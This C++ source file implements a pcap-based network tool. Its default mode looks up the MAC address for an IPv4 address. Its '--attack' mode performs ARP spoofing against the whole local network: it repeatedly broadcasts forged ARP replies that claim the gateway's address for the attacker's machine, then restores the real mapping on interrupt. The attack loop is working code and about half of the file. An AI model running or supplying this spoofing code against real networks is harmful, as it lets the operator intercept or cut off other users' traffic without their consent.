#include "transport/transport.h"
#include <signal.h>
#include <atomic>
#include <thread>
#include <iostream>

DEFINE_bool(attack, false, "attack whole network by pretending myself to be gateway");

std::atomic<bool> end_attack = false;

void on_interrupt(int) { end_attack = true; }

int main(int argc, char *argv[])
{
    NT_TRY
    INIT_LOG(argc, argv);
    if (argc < 2 && !FLAGS_attack) {
        LOG(ERROR) << "empty ipv4 address, please input ip";
        return -1;
    }

    ip4 ip = argc >= 2 ? ip4(argv[1]) : ip4::zeros;
    auto &apt = adaptor::fit(ip);
    pcap_t *handle = transport::open_adaptor(apt);
    std::shared_ptr<void> handle_guard(nullptr, [&](void *) { pcap_close(handle); });

    if (!FLAGS_attack) {
        mac mac_;
        if (transport::ip2mac(handle, ip, mac_)) {
            std::cout << ip.to_str() << " is at " << mac_.to_str() << "." << std::endl;
        } else {
            std::cout << ip.to_str() << " is offline." << std::endl;
        }
    } else {
        signal(SIGINT, on_interrupt);
        mac gateway_mac;
        if (transport::ip2mac(handle, apt.gateway, gateway_mac)) {
            LOG(INFO) << "gateway {} is at {}"_format(apt.gateway.to_str(), gateway_mac.to_str());
        }
        LOG(INFO) << "forging gateway's mac to {}..."_format(apt.mac_.to_str());
        auto lie = packet::arp(apt.mac_, apt.gateway, apt.mac_, apt.ip, true);
        while (!end_attack) {
            transport::send(handle, lie);
            std::this_thread::sleep_for(1000ms);
        }
        LOG(INFO) << "attack stopped";
        if (transport::ip2mac(handle, apt.gateway, gateway_mac, false)) {
            auto truth = packet::arp(gateway_mac, apt.gateway, apt.mac_, apt.ip, true);
            transport::send(handle, truth);
            LOG(INFO) << "gateway's mac restored to {}"_format(gateway_mac.to_str());
        }
    }
    NT_CATCH
}
